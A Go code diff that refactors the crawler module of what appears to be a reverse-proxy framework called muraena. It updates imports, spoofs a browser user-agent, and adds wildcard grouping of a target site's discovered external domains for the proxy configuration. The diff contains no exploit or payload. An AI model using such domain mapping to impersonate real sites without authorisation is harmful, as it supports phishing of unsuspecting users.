@@ -3,15 +3,17 @@ package crawler
 import (
 	"fmt"
 	"net/url"
+	"regexp"
 	"strings"
 	"sync"
 	"time"
 
 	"github.com/ditashi/jsbeautifier-go/jsbeautifier"
 	"github.com/evilsocket/islazy/tui"
-	"github.com/gocolly/colly"
+	"github.com/gocolly/colly/v2"
+	"github.com/icza/abcsort"
 	"gopkg.in/resty.v1"
-	"mvdan.cc/xurls"
+	"mvdan.cc/xurls/v2"
 
 	"github.com/muraenateam/muraena/proxy"
 	"github.com/muraenateam/muraena/session"
@@ -40,9 +42,9 @@ type Crawler struct {
 }
 
 var (
-	subdomains, uniqueDomains []string
 	discoveredJsUrls          []string
 	waitGroup                 sync.WaitGroup
+	rgxURLS                   *regexp.Regexp
 )
 
 // Name returns the module name
@@ -76,6 +78,8 @@ func Load(s *session.Session) (m *Crawler, err error) {
 		Depth:         config.Depth,
 	}
 
+	rgxURLS = xurls.Strict()
+
 	// Armor domains
 	config.ExternalOrigins = proxy.ArmorDomain(config.ExternalOrigins)
 	if !m.Enabled {
@@ -84,24 +88,20 @@ func Load(s *session.Session) (m *Crawler, err error) {
 	}
 
 	m.explore()
-	waitGroup.Wait()
-	config.ExternalOrigins = proxy.ArmorDomain(m.Domains)
+	m.SimplifyDomains()
+	config.ExternalOrigins = m.Domains
 
 	m.Info("Domain crawling stats:")
-	err = s.UpdateConfiguration(&config.ExternalOrigins, &subdomains, &uniqueDomains)
+	err = s.UpdateConfiguration(&m.Domains)
+
 	return
 }
 
 func (module *Crawler) explore() {
-
-	var config *session.Configuration
-	config = module.Session.Config
-
-	module.Info("Starting exploration of %s (crawlDepth:%d crawlMaxReq: %d), just a few seconds...",
-		config.Proxy.Target, module.Depth, module.UpTo)
+	waitGroup.Wait()
 
 	c := colly.NewCollector(
-		colly.UserAgent("Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0"),
+		colly.UserAgent("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"),
 
 		// MaxDepth is by default 1, so only the links on the scraped page are visited,
 		// and no further links are followed
@@ -123,7 +123,7 @@ func (module *Crawler) explore() {
 			// if it is a script from an external domain, make sure to fetch it
 			// beautify it and see it we need to replace things
 			waitGroup.Add(1)
-			go module.fetchJS(&waitGroup, res, config.Proxy.Target)
+			go module.fetchJS(&waitGroup, res)
 		}
 
 	})
@@ -148,11 +148,6 @@ func (module *Crawler) explore() {
 	c.OnHTML("a[href]", func(e *colly.HTMLElement) {
 		res := e.Attr("href")
 		module.appendExternalDomain(res)
-
-		// crawl
-		if err := c.Visit(e.Request.AbsoluteURL(res)); err != nil {
-			// module.Debug("[Colly Visit]%s", err)
-		}
 	})
 
 	if err := c.Limit(&colly.LimitRule{DomainGlob: "*", RandomDelay: 500 * time.Millisecond}); err != nil {
@@ -163,6 +158,14 @@ func (module *Crawler) explore() {
 
 	c.OnRequest(func(r *colly.Request) {})
 
+
+
+	var config *session.Configuration
+	config = module.Session.Config
+
+	module.Info("Starting exploration of %s (crawlDepth:%d crawlMaxReq: %d), just a few seconds...",
+		config.Proxy.Target, module.Depth, module.UpTo)
+
 	dest := fmt.Sprintf("%s%s", config.Protocol, config.Proxy.Target)
 	err := c.Visit(dest)
 	if err != nil {
@@ -170,7 +173,7 @@ func (module *Crawler) explore() {
 	}
 }
 
-func (module *Crawler) fetchJS(waitGroup *sync.WaitGroup, res string, dest string) {
+func (module *Crawler) fetchJS(waitGroup *sync.WaitGroup, res string) {
 
 	defer waitGroup.Done()
 
@@ -182,21 +185,22 @@ func (module *Crawler) fetchJS(waitGroup *sync.WaitGroup, res string, dest strin
 	nu := fmt.Sprintf("%s%s", u.Host, u.Path)
 	if !Contains(&discoveredJsUrls, nu) {
 		discoveredJsUrls = append(discoveredJsUrls, nu)
-		module.Debug("Fetching new JS URL: %s", nu)
-
+		module.Debug("New JS: %s", nu)
 		resp, err := resty.R().Get(res)
 		if err != nil {
 			module.Error("Error fetching JS at %s: %s", res, err)
+			return
 		}
-		body := string(resp.Body())
 
+		body := string(resp.Body())
 		opts := jsbeautifier.DefaultOptions()
 		beautyBody, err := jsbeautifier.Beautify(&body, opts)
 		if err != nil {
 			module.Error("Error beautifying JS at %s", res)
+			return
 		}
 
-		jsUrls := xurls.Strict.FindAllString(beautyBody, -1)
+		jsUrls := rgxURLS.FindAllString(beautyBody, -1)
 		if len(jsUrls) > 0 && len(jsUrls) < 100 { // prevent cases where we have a lots of domains
 			for _, jsURL := range jsUrls {
 				module.appendExternalDomain(jsURL)
@@ -213,7 +217,7 @@ func (module *Crawler) appendExternalDomain(res string) bool {
 			module.Error("url.Parse error, skipping external domain %s: %s", res, err)
 			return false
 		}
-		// update the crawledDomains after doing some minimal checks that might happen from xurls when
+		// update the Domains after doing some minimal checks that might happen from xurls when
 		// parsing urls from JS files
 		if len(u.Host) > 2 && (strings.Contains(u.Host, ".") || strings.Contains(u.Host, ":")) {
 			module.Domains = append(module.Domains, u.Host)
@@ -221,5 +225,44 @@ func (module *Crawler) appendExternalDomain(res string) bool {
 
 		return true
 	}
+
 	return false
+}
+
+func reverseString(ss []string) []string {
+	last := len(ss) - 1
+	for i := 0; i < len(ss)/2; i++ {
+		ss[i], ss[last-i] = ss[last-i], ss[i]
+	}
+
+	return ss
+}
+
+// SimplifyDomains simplifies the Domains slice by grouping subdomains of 3rd and 4th level as *.<domain>
+func (module *Crawler) SimplifyDomains() {
+
+	var domains []string
+	for _, d := range module.Domains {
+
+		host := strings.TrimSpace(d)
+		hostParts := reverseString(strings.Split(host, "."))
+
+		switch len(hostParts) {
+		case 3:
+			host = fmt.Sprintf("*.%s.%s", hostParts[1], hostParts[0])
+		case 4:
+			host = fmt.Sprintf("*.%s.%s.%s", hostParts[2], hostParts[1], hostParts[0])
+
+		default:
+			// Don't do anything, more than 3rd level is too much
+		}
+
+		domains = append(domains, host)
+	}
+
+	sorter := abcsort.New("*")
+	domains = proxy.ArmorDomain(domains)
+	sorter.Strings(domains)
+
+	module.Domains = domains
 }
